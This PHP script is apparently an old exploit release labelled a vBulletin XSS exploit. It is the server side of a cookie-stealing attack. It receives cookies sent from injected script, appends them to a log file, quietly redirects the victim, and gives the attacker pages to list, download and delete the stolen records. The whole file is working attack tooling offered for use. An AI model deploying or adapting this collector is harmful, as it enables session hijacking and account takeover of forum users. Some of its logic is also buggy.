<?PHP
      // vBulletin XSS Injection Vulnerability: Exploit
      // ---
      // Coded By : Sp.IC (SpeedICNet@Hotmail.Com).
      // Descrption: Fetching vBulletin's cookies and storing it into a
log file.

      // Variables:

      $LogFile = "Cookies.Log";

      // Functions:
      /*
      If ($HTTP_GET_VARS['Action'] = "Log") {
          $Header = "<!--";
          $Footer = "--->";
      }
      Else {

           $Header = "";
           $Footer = "";
      }
      Print ($Header);
      */
      Print ("<Title>vBulletin XSS Injection Vulnerability:
Exploit</Title>");
      Print ("<Pre>");
      Print ("<Center>");
      Print ("<B>vBulletin XSS Injection Vulnerability: Exploit</B>\n");
      Print ("Coded By: <B><A
Href=\"MailTo:SpeedICNet@Hotmail.Com\">Sp.IC</A></B><Hr Width=\"20%\">");
      /*
      Print ($Footer);
      */

      Switch ($HTTP_GET_VARS['Action']) {
          Case "Log":

                 $Data = $HTTP_GET_VARS['Cookie'];
                 $Data = StrStr ($Data, SubStr ($Data, BCAdd (0x0D, StrLen
(DecHex (MD5 (NULL))))));
                 $Log = FOpen ($LogFile, "a+");
                         FWrite ($Log, Trim ($Data) . "\n");
                         FClose ($Log);
                         Print ("<Meta HTTP-Equiv=\"Refresh\" Content=\"0;
URL=" . $HTTP_SERVER_VARS['HTTP_REFERER'] . "\">");
          Break;
                Case "List":
                 If (!File_Exists ($LogFile) || !In_Array ($Records)) {
                     Print ("<Br><Br><B>There are No
Records</B></Center></Pre>");
                     Exit ();
                 }
                 Else {
                     Print ("</Center></Pre>");
                     $Records = Array_UniQue (File ($LogFile));
                                  Print ("<Pre>");
                                  Print ("<B>.:: Statics</B>\n");
                     Print ("\n");
                                  Print ("o Logged Records : <B>" . Count
(File ($LogFile)) . "</B>\n");
                     Print ("o Listed Records : <B>" . Count
($Records) . " </B>[Not Counting Duplicates]\n");
                     Print ("\n");

                     Print ("<B>.:: Options</B>\n");
                     Print ("\n");

                     If (Count (File ($LogFile)) > 0) {
                         $Link['Download'] = "[<A Href=\"" .
$LogFile . "\">Download</A>]";
                     }
                     Else{
                         $Link['Download'] = "[No Records in Log]";
                     }

                     Print ("o Download Log : " . $Link
['Download'] . "\n");
                     Print ("o Clear Records : [<A Href=\"" .
$SCRIPT_PATH. "?Action=Delete\">Y</A>]\n");
                     Print ("\n");
                     Print ("<B>.:: Records</B>\n");
                     Print ("\n");

                     While (List ($Line[0], $Line[1]) = Each ($Records)) {
                         Print ("<B>" . $Line[0] . ": </B>" . $Line[1]);
                     }
                 }

                 Print ("</Pre>");
          Break;
          Case "Delete":
              @UnLink ($LogFile);
              Print ("<Br><Br><B>Deleted Succsesfuly</B></Center></Pre>")
Or Die ("<Br><Br><B>Error: Cannot Delete Log</B></Center></Pre>");
              Print ("<Meta HTTP-Equiv=\"Refresh\" Content=\"3; URL=" .
$HTTP_SERVER_VARS['HTTP_REFERER'] . "\">");
          Break;
      }
    ?>